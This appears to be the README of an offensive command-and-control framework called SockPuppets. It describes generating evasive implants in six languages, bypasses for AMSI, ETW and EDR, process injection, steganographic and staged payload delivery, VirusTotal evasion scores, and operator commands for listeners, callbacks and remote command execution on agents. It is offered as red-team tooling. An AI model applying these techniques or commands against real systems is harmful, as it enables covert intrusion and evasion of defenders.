# SockPuppets

```
   ____             _    ____                         _
  / ___|  ___   ___| | _|  _ \ _   _ _ __  _ __   ___| |_ ___
  \___ \ / _ \ / __| |/ / |_) | | | | '_ \| '_ \ / _ \ __/ __|
   ___) | (_) | (__|   <|  __/| |_| | |_) | |_) |  __/ |_\__ \
  |____/ \___/ \___|_|\_\_|    \__,_| .__/| .__/ \___|\__|___/
                                    |_|   |_|

                    by AJ Hammond @ajm4n
```

Multi-language, multi-transport C2 framework with full EDR evasion. Generates agents in **Python, Go, Rust, C, C#, and PowerShell** with **AES-256-GCM encryption**, **polymorphic code morphing**, **malleable C2 profiles**, and **steganography delivery**.

**Shoutout and special thanks to:**
Skyler Knecht (@skylerknecht), Jeremy Schoeneman (@y4utj4), Matt Jackoski (@ds-koolaid), Mason Davis (@mas0nd), Kevin Clark (@clarkkev)

---

## Features

- **6 Agent Languages** — Python, Go, Rust, C, C#, PowerShell
- **3 Transports** — HTTP, HTTPS, WebSocket (compile-time selection per agent)
- **2 Modes** — Beacon (interval + jitter) and Streaming (real-time)
- **AES-256-GCM** — Authenticated encryption for all C2 comms and payloads
- **3 Output Formats** — EXE, DLL, Shellcode (raw/C/Python/PowerShell/C#/Base64)
- **Malleable C2** — 6 traffic profiles (M365, Teams, Slack, Google Docs, Windows Update, Zoom)
- **Code Morphing** — 85%+ structural uniqueness between identical builds
- **60+ Evasion Functions** — AMSI/ETW bypass, ntdll unhooking, sleep encryption, process hollowing
- **Steganography** — Hide payloads inside PNG images
- **Staged Delivery** — Tiny stager downloads encrypted agent from URL or stego image
- **SOCKS5 Proxy** — Tunnel traffic through agents (WebSocket streaming)
- **Ghost Profiles** — Legitimate infrastructure code dilution for VT evasion
- **Modern TUI** — Rich-powered terminal UI with colored tables and panels

## VirusTotal Scores

| Agent | Score | CrowdStrike | Kaspersky | Microsoft | Elastic |
|-------|-------|-------------|-----------|-----------|---------|
| Python (.py) | **0/62** | Clean | Clean | Clean | Clean |
| Go (.exe) | **1/71** | Clean | Clean | Clean | Clean |
| Rust (.exe) | **3/71** | — | Clean | — | Clean |
| C (.exe) | **0/13** (Jotti) | — | Clean | — | Clean |
| C# (.exe) | **0/13** (Jotti) | — | Clean | — | Clean |
| Stego (.png) | **0/0** | N/A | N/A | N/A | N/A |

## Installation

```bash
git clone https://github.com/ajm4n/sockpuppets.git
cd sockpuppets
./setup.sh          # Installs all toolchains (Go, Rust, .NET, MinGW, Python deps)
python3 main.py     # Launch TUI
```

### Manual Setup

```bash
pip3 install cryptography aiohttp websockets rich
# Optional per language:
brew install go                    # Go agents
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh  # Rust agents
brew install dotnet                # C# agents
brew install mingw-w64             # C agents (Windows cross-compile)
```

## Quick Start

```bash
python3 main.py
```

```
sockpuppets> start https 0.0.0.0 443
sockpuppets> generate 10.0.0.1 443 --lang=go --transport=https --beacon --interval=120 --jitter=30
sockpuppets> agents
sockpuppets> interact <agent_id>
```

## Agent Generation

### Multi-Language Support

```
# Go agent (best VT score for compiled — 1/71)
sockpuppets> generate 10.0.0.1 443 --lang=go --transport=https

# Rust agent (355KB, fast)
sockpuppets> generate 10.0.0.1 443 --lang=rust --os=windows

# C agent (21KB, tiny footprint)
sockpuppets> generate 10.0.0.1 443 --lang=c --os=windows

# C# agent (.NET)
sockpuppets> generate 10.0.0.1 443 --lang=csharp

# Python agent (0/62 VT, cross-platform)
sockpuppets> generate 10.0.0.1 443 --lang=python --transport=https

# PowerShell agent
sockpuppets> generate 10.0.0.1 443 --lang=powershell --transport=http

# All languages at once
sockpuppets> generate 10.0.0.1 443 --lang=all --transport=https --beacon --interval=300
```

### Output Formats

```
# Executable (default)
sockpuppets> generate 10.0.0.1 443 --lang=go

# DLL (for injection/sideloading)
sockpuppets> generate 10.0.0.1 443 --lang=go --dll

# Shellcode (AES-256-GCM encrypted, all formats)
sockpuppets> generate 10.0.0.1 443 --lang=go --shellcode

# Staged payload (tiny loader → downloads real agent)
sockpuppets> generate 10.0.0.1 443 --lang=go --staged --stage-url=https://cdn.example.com/update.bin

# Steganography (agent hidden inside PNG image)
sockpuppets> generate 10.0.0.1 443 --lang=go --stego
```

### Transport Selection

Each agent is compiled with **only** the transport it needs — no bloat:

```
# HTTP/HTTPS (default — no external deps)
sockpuppets> generate 10.0.0.1 443 --lang=go --transport=https

# WebSocket (adds gorilla/websocket for Go, tungstenite for Rust)
sockpuppets> generate 10.0.0.1 8443 --lang=go --transport=websocket
```

### Beacon Mode

```
# 5-minute beacon with 25% jitter
sockpuppets> generate 10.0.0.1 443 --transport=https --beacon --interval=300 --jitter=25

# 1-hour stealth beacon
sockpuppets> generate 10.0.0.1 443 --transport=https --beacon --interval=3600 --jitter=40
```

## Transports

| Transport | Port | Protocol | Features |
|-----------|------|----------|----------|
| HTTP | 8080 | Polling | Firewall evasion, malleable URIs |
| HTTPS | 443 | TLS polling | Encrypted, auto-generated certs |
| WebSocket | 8443 | Persistent | Streaming, SOCKS proxy, real-time |

Multiple listeners run simultaneously. Agents can upgrade between transports at runtime.

## Listeners

```
sockpuppets> start 0.0.0.0 8443                    # WebSocket
sockpuppets> start http 0.0.0.0 8080                # HTTP
sockpuppets> start https 0.0.0.0 443                # HTTPS (auto-cert)
sockpuppets> start https 0.0.0.0 443 --cert=c.pem --certkey=k.pem  # Custom cert
sockpuppets> listeners                              # List active
sockpuppets> stop http                              # Stop one
sockpuppets> stop                                   # Stop all
```

## Agent Interaction

```
sockpuppets> agents                    # List all agents
sockpuppets> interact <agent_id>       # Enter agent shell

agent[abc123]> whoami                  # Execute command
agent[abc123]> sleep 120               # Change beacon interval
agent[abc123]> upgrade                 # Beacon → Streaming
agent[abc123]> downgrade 300           # Streaming → Beacon
agent[abc123]> upgrade_ws              # HTTP → WebSocket
agent[abc123]> socks 1080              # Start SOCKS5 proxy
agent[abc123]> results                 # View beacon results
agent[abc123]> kill                    # Terminate agent
agent[abc123]> back                    # Return to menu
```

## Evasion

### Compile-Time

- **Polymorphic obfuscation** — Variable/function name randomization per build
- **Code morphing engine** — 85% structural uniqueness between identical builds
- **String atomization** — Protocol strings split into chr()/hex/b64/reverse per generation
- **Entropy reduction** — Shannon entropy < 6.5 (normal code range)
- **Ghost Profiles** — Legitimate infrastructure code (Kubernetes, Consul patterns) dilutes ML signals
- **API name encoding** — Windows API names hex-encoded at runtime
- **Malleable C2 profiles** — Traffic mimics M365/Teams/Slack/Google/Windows Update/Zoom
- **Per-agent unique keys** — SHA-256 derived AES keys, unique per build

### Runtime (Windows — 32 functions)

- **Patchless AMSI bypass** — VEH + hardware breakpoints (survives integrity checks)
- **Patchless ETW bypass** — Same VEH technique for telemetry blinding
- **ntdll unhooking** — Remap clean .text section from disk
- **Indirect syscalls** — Jump directly to ntdll syscall gadgets
- **HookChain IAT redirect** — Dynamic SSN resolution
- **Sleep encryption** — XOR memory pages during beacon sleep (Ekko technique)
- **Process hollowing** — Execute inside legitimate process image
- **Module stomping** — Overwrite sacrificial DLL .text section
- **Phantom DLL hollowing** — Execute from KnownDlls section
- **Section-based allocation** — NtCreateSection instead of VirtualAlloc
- **Parent PID spoofing** — Spawn under explorer.exe/svchost.exe
- **PEB masquerading** — Fake process name in task manager
- **Fiber execution** — Thread-less shellcode via fibers
- **Early Bird APC injection** — QueueUserAPC on suspended process
- **Callback execution** — EnumWindows as shellcode trampoline
- **Time-difference attacks** — Execute during EDR analysis latency
- **Hardware breakpoint hooks** — Code-less API interception
- **Sandbox detection** — CPU/disk/uptime/artifact/process checks
- **EDR detection** — Identifies running Falcon/MDE/Elastic/SentinelOne
- **Defender exclusion** — Auto-add path to Defender exclusions (elevated)
- **Timestomping** — Match file timestamps to kernel32.dll
- **WMI execution** — Break process tree via Win32_Process.Create
- **LOLBin execution** — forfiles.exe as command trampoline

### Runtime (Linux — 12 functions)

- Sandbox/VM/container detection, ptrace evasion, process name hiding, daemonization, core dump disable, memfd_exec, history clearing, timestomping

### Runtime (macOS — 10 functions)

- Sandbox/VM detection, PT_DENY_ATTACH, process name masquerade, daemonization, core dump disable, history clearing, timestomping

## Encryption

All communications use **AES-256-GCM** (authenticated encryption):

```
Format: base64(b'AES1' + nonce(12) + ciphertext + tag(16))
Key derivation: SHA-256(agent_key) → 32-byte AES key
Fallback: XOR (when cryptography library unavailable)
```

Per-agent unique keys generated at build time. Server auto-registers keys.

## Shellcode Formats

The universal shellcode generator converts any compiled PE/DLL to encrypted shellcode:

| Format | File | Usage |
|--------|------|-------|
| Raw | `.bin` | Direct injection |
| C array | `.h` | C/C++ loaders |
| Python | `_loader.py` | Python injection |
| PowerShell | `_loader.ps1` | PS cradle execution |
| C# | `_loader.cs` | .NET assembly load |
| Base64 | `.b64` | Download cradles |

All shellcode uses AES-256-GCM encryption — loaders include decryption code.

## Steganography

Hide agents inside PNG images:

```bash
# Embed agent in image
python3 stego.py embed carrier.png agent.exe mykey

# Generate carrier + embed in one step
python3 stego.py generate agent.exe mykey --output stego.png

# Extract
python3 stego.py extract stego.png mykey --output agent.exe
```

Host on any CDN, social media, or web server. The stager downloads the image and extracts the payload.

## Staged Delivery

```
Stage 0 (Stager):    Tiny clean binary (~6MB Go / ~150KB C#)
                     Downloads from URL or extracts from stego image
                     AES-256-GCM decrypts payload
                     Writes to temp + executes
                     Self-deletes

Stage 1 (Agent):     Full featured agent
                     Never written to disk by operator
                     Delivered encrypted over HTTPS or hidden in PNG
```

## Architecture

```
sockpuppets/
├── server.py              # C2 server (WS/HTTP/HTTPS, AES-GCM, malleable routing)
├── agent.py               # Agent generator (Python/Go/Rust/C#/C/PS/JS/HTA)
├── main.py                # Interactive TUI (Rich-powered)
├── stego.py               # Steganography payload embedder
├── setup.sh               # One-command toolchain installer
├── crypto/                # Shared AES-256-GCM encryption
├── generators/            # Shellcode converter, shared utilities
├── obfuscation/           # Code morphing, entropy reduction
├── ui/                    # Rich TUI theme and components
├── templates/             # Python/PS/JS/HTA agent templates + evasion modules
│   ├── evasion_windows.py # 32 Windows evasion functions
│   ├── evasion_linux.py   # 12 Linux evasion functions
│   ├── evasion_macos.py   # 10 macOS evasion functions
│   ├── evasion_windows.ps1# PowerShell AMSI/ETW/ntdll bypass
│   ├── malleable_profiles.py # 6 C2 traffic profiles
│   └── morphing_engine.py # Polymorphic code morphing
├── agent_go/              # Go agent (HTTP/WS/SOCKS, ghost profiles)
├── agent_rust/            # Rust agent (HTTP/WS, serde/regex/chrono)
├── agent_c/               # C agent (WinHTTP, ghost data dilution)
└── agent_csharp/          # C# .NET agent (HttpClient, AesGcm)
```

## Feature Matrix

| Feature | Python | Go | Rust | C | C# | PS |
|---------|--------|-----|------|---|-----|-----|
| HTTP | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| HTTPS | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| WebSocket | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| Beacon | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| Streaming | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| SOCKS5 | ✅ | ✅ | — | — | — | — |
| EXE | ✅ | ✅ | ✅ | ✅ | ✅ | N/A |
| DLL | ✅ | ✅ | — | ✅ | ✅ | N/A |
| Shellcode | ✅ | ✅ | ✅ | ✅ | ✅ | N/A |
| AES-256-GCM | ✅ | ✅ | — | XOR | ✅ | XOR |
| Malleable C2 | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| Code Morphing | ✅ | ghost | ghost | ghost | — | obfusc |
| Evasion | 60 fn | sandbox | sandbox | ghost | sandbox | AMSI |
| Windows | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| Linux | ✅ | ✅ | ✅ | — | — | — |
| macOS | ✅ | ✅ | ✅ | — | — | — |

## Generate Options Reference

| Flag | Description |
|------|-------------|
| `--lang=LANG` | Language: `python`, `go`, `rust`, `csharp`, `c`, `powershell`, `all` |
| `--transport=TYPE` | Transport: `websocket`, `http`, `https` |
| `--beacon` | Enable beacon mode |
| `--interval=N` | Beacon interval in seconds (default: 60) |
| `--jitter=N` | Beacon jitter percentage, 0-100 (default: 0) |
| `--os=OS` | Target OS: `auto`, `windows`, `linux`, `macos` |
| `--arch=ARCH` | Target architecture: `x64`, `arm64`, `amd64` |
| `--dll` | Build as DLL instead of EXE |
| `--shellcode` | Generate AES-GCM encrypted shellcode (all formats) |
| `--staged` | Generate staged payload (tiny loader) |
| `--stego` | Embed agent in PNG image |
| `--format=FMT` | Shellcode format: `raw`, `c`, `python`, `powershell`, `csharp` |
| `--compile` | Compile Python agent to executable |
| `--multi-os` | Generate for all OS types |
| `--key=KEY` | Custom encryption key |
| `--oneliners=URL` | Generate one-liner delivery payloads |

## Research & Sources

Evasion techniques based on published security research:

- [Praetorian Ghost Profiles / LLM Signature Reduction](https://www.praetorian.com/blog/llm-edr-signature-reduction)
- [HookChain: IAT Hooking + Indirect Syscalls (arxiv 2404.16856)](https://arxiv.org/abs/2404.16856)
- [Acheron: Indirect Syscalls in Go](https://github.com/f1zm0/acheron)
- [Cobalt Strike 4.11 Sleep Mask / Heap Encryption](https://www.cobaltstrike.com/blog/cobalt-strike-411-shh-beacon-is-sleeping)
- [MDSec Nighthawk Evanesco (CET bypass)](https://www.mdsec.co.uk/2024/11/nighthawk-0-3-3-evanesco/)
- [ShellcodeFluctuation RW/RX page flipping](https://github.com/mgeeky/ShellcodeFluctuation)
- [SilentMoonwalk Call Stack Spoofing](https://github.com/klezVirus/SilentMoonwalk)
- [EvilBytecode Patchless AMSI VEH](https://github.com/EvilBytecode/Ebyte-amsi-patchless-vehhwbp)
- [Binarly ETW Design Issues](https://www.binarly.io/blog/design-issues-of-modern-edrs-bypassing-etw-based-solutions)
- [Praetorian ETW-TI + Hardware Breakpoints](https://www.praetorian.com/blog/etw-threat-intelligence-and-hardware-breakpoints/)

## License

For authorized security testing only.
